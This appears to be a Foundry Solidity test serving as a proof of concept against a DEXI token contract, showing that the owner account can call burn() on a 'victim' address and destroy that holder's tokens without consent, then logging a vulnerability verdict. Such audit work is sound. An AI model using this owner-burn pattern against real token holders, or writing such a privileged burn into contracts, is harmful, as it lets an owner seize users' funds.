// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/DEXI.sol";

contract BurnTest is Test {
    DEXI token;
    address owner = address(0x1);
    address victim = address(0x2);

    function setUp() public {
        vm.startPrank(owner);
        token = new DEXI();
        
        // Exclude addresses from fees
        token.excludeFromFee(owner);
        token.excludeFromFee(victim);
        
        // Transfer initial tokens to victim
        uint8 decimals = token.decimals();
        uint256 amountToVictim = 100 * (10 ** uint256(decimals));
        token.transfer(victim, amountToVictim);
        vm.stopPrank();
    }

    function testOwnerCanArbitrarilyBurnUserTokens() public {
        uint256 decimals = token.decimals();
        uint256 burnAmount = 25 * (10 ** decimals);
        
        // Get balances before burn
        uint256 victimBalanceBefore = token.balanceOf(victim);
        uint256 totalSupplyBefore = token.totalSupply();
        
        console.log("--- BEFORE-Trigger Burn ---");
        console.log("Victim token balance:", victimBalanceBefore);
        console.log("Token total supply:", totalSupplyBefore);
        
        console.log("--- Trigger Burn ---");
        vm.prank(owner);
        token.burn(victim, burnAmount);

        // Get balances after burn
        uint256 victimBalanceAfter = token.balanceOf(victim);
        uint256 totalSupplyAfter = token.totalSupply();
        
        console.log("--- AFTER-Trigger Burn ---");
        console.log("Victim token balance:", victimBalanceAfter);
        console.log("Token total supply:", totalSupplyAfter);
        
        // Differential verification
        uint256 expectedVictimBalance = victimBalanceBefore - burnAmount;
        uint256 expectedTotalSupply = totalSupplyBefore - burnAmount;
        
        bool victimBalanceChanged = victimBalanceAfter == expectedVictimBalance;
        bool totalSupplyChanged = totalSupplyAfter == expectedTotalSupply;
        bool vulnerabilityExploited = victimBalanceChanged && totalSupplyChanged;
        
        console.log("--- VERIFICATION ---");
        console.log("Balance change expected: %s, actual: %s -> %s", 
                    expectedVictimBalance, victimBalanceAfter, 
                    victimBalanceChanged ? "PASS" : "FAIL");
        console.log("Supply change expected: %s, actual: %s -> %s",
                    expectedTotalSupply, totalSupplyAfter,
                    totalSupplyChanged ? "PASS" : "FAIL");
        
        // Final vulnerability verdict
        if (vulnerabilityExploited) {
            console.log("Vulnerability Exists: Owner can arbitrarily burn victim tokens without consent or fee deduction");
        } else {
            console.log("Vulnerability not Exist: State changes do not match expected burn outcome");
        }
    }
}